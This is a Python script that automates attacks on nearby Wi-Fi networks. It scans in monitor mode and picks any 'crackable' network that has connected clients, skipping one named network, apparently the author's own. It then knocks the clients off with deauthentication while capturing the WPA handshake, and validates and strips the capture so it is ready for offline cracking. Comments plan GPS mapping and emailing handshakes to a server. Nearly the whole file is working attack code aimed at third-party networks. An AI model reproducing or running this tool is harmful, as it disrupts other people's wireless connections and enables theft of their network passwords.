#!/usr/bin/python

import time
import subprocess
import os
import signal
import xml.etree.cElementTree as ET
from subprocess import Popen, call, PIPE
from signal import SIGINT, SIGTERM
from multiprocessing import Process, Pipe
from validate import validator
from scanner import scanner
from watchdog.events import PatternMatchingEventHandler  
from watchdog.observers import Observer
from xml_arse import xml_machine

####improvements:
####
###Add commenting
###
##create temp folders automatically and clean up when finished
##
#Refine the timing of the inject/check/inject cycle.
#
#Report on make/model of attached clients
#
#Add some verbose debug reporting functionality

#Dev null variable for subprocesses
DN = open(os.devnull, 'w')
#wifi interface that is in monitor mode
iface = 'wlan1mon'
#file locations 
##These should be improved to be located in temp files and then cleaned up afterwards
target_dir = '/home/odroid/targets/'
output_dir = '/home/odroid/xmls/'
handshake_dir = '/home/odroid/hs/'

class MyHandler(PatternMatchingEventHandler):
	
	patterns = ["*.xml", "*.netxml"]

##This needs to be improved to tolerate empty xmls...
	def process(self, event):
		#print "Path =", event.src_path					#debug
		#print event.src_path, event.event_type			#debug
		w_xml = xml_machine('%s' % event.src_path)
		crackable_list = w_xml.crackables()
		print "crackable_list:", crackable_list
		if crackable_list == '0':
			print "no luck buddy, keep trying"
		else:
			print "Suitable wireless network(s) detected..."
			for cracker in crackable_list:
				deets = w_xml.parse_deets(cracker)
				if deets != 'None':
					if deets["essid"] != 'petonehappinessclub': 	##ignore this AP
						if deets["client_count"] != 0:
							w_xml.xml_tree(essid=deets["essid"], 
							channel=deets["channel"], 
							bssid=deets["bssid"], 
							packets=deets["packets"], 
							client_list=deets["client_list"],
							client_count=deets["client_count"],)
							w_xml.xml_write(target_dir+cracker+'.xml')

	def on_modified(self, event):
		print "modified observer =", observer
		print event.src_path
		time.sleep(1)
		if os.path.exists(event.src_path):
			self.process(event)

	def on_created(self, event):
		print "created observer =", observer
		print event.src_path
		time.sleep(10)
		if os.path.exists(event.src_path):
			self.process(event)

##This could be made to be WAAAAAAAY more efficient.....
def tidy():
	directory = output_dir
	files_xml = os.listdir(directory)
	print "removing existing xml files:", files_xml
	for file in  files_xml:
		try:
			os.remove(directory+file)        
		except OSError:
			pass
	directory = target_dir
	files_targets = os.listdir(directory)
	print "removing existing target files:", files_targets
	for file in  files_targets:
		try:
			os.remove(directory+"/"+file)        
		except OSError:
			pass
	directory = handshake_dir
	files_handshake = os.listdir(directory)
	print "removing existing handshake files:", files_handshake
	for file in  files_handshake:
		try:
			os.remove(directory+file)        
		except OSError:
			pass

if __name__ == '__main__':
	print "Housekeeping..."
	tidy()
	print "creating general scanner object"
	g_scanner = scanner(iface)
	#print "g_scanner:", g_scanner					#debug
	print "Creating pipe for general scan"
	airodump_parent_conn, airodump_child_conn = Pipe()
	print "Creating process for general scan"
	airodump = Process(target=g_scanner.scan, kwargs={
	'out_format':'netxml', 
	'out_dest':output_dir, 
	'conn':airodump_child_conn})
	print  "Creating process for folder watch"
	observer = Observer()
	observer.schedule(MyHandler(), path=output_dir)
	print "Starting general scan...."
	airodump.start()
	scanning = True
	time_started = time.time()
	#print "time_started:%.0f" % time_started			#debug
	print "Starting folder watchdog..."
	observer.start()
	while True:
		time.sleep(1)
		airodump_parent_conn.send(scanning)
		print "General scan now running for: %.0f seconds" % (time.time() - time_started)
		file_list = os.listdir(target_dir)
		if time.time() - time_started >= 60:
			print "times up, aborting general scan bitches..."	
			scanning = False
			break
		if file_list != []:
			print "targets detected, aborting general scan bitches..."
			scanning = False
			break		   
	observer.stop()		
	airodump_parent_conn.send(scanning)
	airodump_parent_conn.close()
#take GPS position and plot name of wifi network on map
#To be writted here.....
	if file_list != []:
#parse xml exported previously with target deets
#improve this to iterate through each suitable xml in the targets folder
		f_xml = xml_machine(target_dir+file_list[0])
		f_xml_deets = f_xml.parse_deets(f_xml.parse_name())
		print "f_xml_deets:", f_xml_deets
#start airodump-ng focussed attack using deets parsed from xml
		print "creating focussed scanner object"
		f_scanner = scanner(iface)
		#print "f_scanner:", f_scanner					#debug
		f_airodump_parent_conn, f_airodump_child_conn = Pipe()
		deauth_parent_conn, deauth_child_conn = Pipe()
		f_airodump = Process(target=f_scanner.scan, kwargs={ 
		'out_format':'pcap', 
		'out_dest':handshake_dir, 
		'channel':f_xml_deets["channel"],
		'conn':f_airodump_child_conn})
##This deauth process could focus on clients in order, just do first one for now....	
		#MAC = f_xml_deets["client_list"]			#debug
		#print "MAC:", MAC 							#debug
		#print "MAC 01:", (MAC[0]) 					#debug
		f_deauth = Process(target=f_scanner.deauth, kwargs={ 
		'essid':f_xml_deets["essid"],
		'bssid':f_xml_deets["bssid"],
		'client_MAC':(f_xml_deets["client_list"]),	#expects a list
		'conn':deauth_child_conn})
#start airodump-ng process - focussed this time
		print "Attempting to start focussed airodump process..."
		f_airodump.start()
#start aireply-ng process with deauth method. This could be more refined to focus on loop of listed clients
		print "Attempting to start deauth process..."
		f_deauth.start()
		time_started = time.time()
		scanning = True
		while True:
			f_airodump_parent_conn.send(scanning)
			deauth_parent_conn.send(scanning)
			time.sleep(10)
##scan pcap file for valid handshake EAPOL packets
			print "Validating handshake..."
			files_handshake = os.listdir(handshake_dir)
			for file in files_handshake:				##This is rubbish, improve!!!
				handshake_file = (handshake_dir+file)        
				valid = validator(SSID=(f_xml_deets["essid"]), 
				BSSID=(f_xml_deets["bssid"]), 
				capfile=handshake_file)
			check_hs = valid.validate_handshake()
			print "validation result:", check_hs
			if check_hs != True:
				print "Analyzing handshake..."
				check_hs = valid.analyze()					#what to do with this?
				print "analyze result:", check_hs
#when handshake detected stop focussed attack			
			if check_hs == True:			
				print "Handshake captured, my job here is done..."	
				scanning = False
				f_airodump_parent_conn.send(scanning)
				deauth_parent_conn.send(scanning)
				f_airodump_parent_conn.close()
				deauth_parent_conn.close()
				break
#time-out in case no handshakes are captured
##make this option controllable via args???			
			print "Focussed attack now running for: %.0f seconds" % (time.time() - time_started)
			if time.time() - time_started >= 60:
				print "times up, aborting focussed attack..."	
				scanning = False
				f_airodump_parent_conn.send(scanning)
				deauth_parent_conn.send(scanning)
				f_airodump_parent_conn.close()
				deauth_parent_conn.close()
				break								
	else:
		print "No suitable networks detected."
	if check_hs == True:
		print "Stripping handshake cap file of unnecessary packets"
		valid.strip(handshake_dir+'strip.cap')
		print "Vaidating stripped cap file..."
		strip_valid = validator(SSID=(f_xml_deets["essid"]), 
		BSSID=(f_xml_deets["bssid"]), 
		capfile=handshake_dir+'strip.cap')
		strip_check_hs = strip_valid.validate_handshake()
		if strip_check_hs == True:
			print "Valid handshake detected and stripped cap file ready for cracking!"
		elif strip_check_hs != True:
			print "something went wrong with stripped validate process...."	
	print "up to here..."		
#process handshake file if required here: analyze, strip and validate

#export processed handshake file and email to processing server
  
#return to top of loop and continue scanning...